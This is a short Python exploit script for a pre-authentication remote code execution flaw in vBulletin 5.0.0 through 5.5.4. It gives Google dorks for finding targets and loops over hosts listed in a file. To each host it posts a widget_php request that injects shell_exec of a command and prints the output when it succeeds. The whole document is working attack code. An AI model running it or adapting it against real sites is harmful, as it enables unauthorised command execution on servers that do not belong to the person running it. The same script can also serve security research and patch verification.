#!/usr/bin/python
#
# vBulletin 5.x 0day pre-auth RCE exploit
# 
# This should work on all versions from 5.0.0 till 5.5.4
#
# Google Dorks:
# - site:*.vbulletin.net
# - "Powered by vBulletin Version 5.5.4"
# source:https://seclists.org/fulldisclosure/2019/Sep/31

import requests
import sys

def test_post_http(ip):
    print "-------------------"
    if 'https' in ip:
        print ip
    else:
        ip="http://"+ip
        print ip
    params = {"routestring":"ajax/render/widget_php"}
    try:
        cmd = "id"
        params["widgetConfig[code]"] = "echo shell_exec('"+cmd+"'); exit;"
        r = requests.post(url = ip, data = params, timeout=10)
        if r.status_code == 200:
            if "uid=" in r.text:
                print r.text
                print "[+]"
        else:
            print "Exploit failed! :("

    except Exception, e:
        print '[!]Error:%s'%e
        
 
if __name__ == '__main__':
    file_object = open('ip.txt', 'r')
    for line in file_object:
        test_post_http(line.strip('\r\n'))

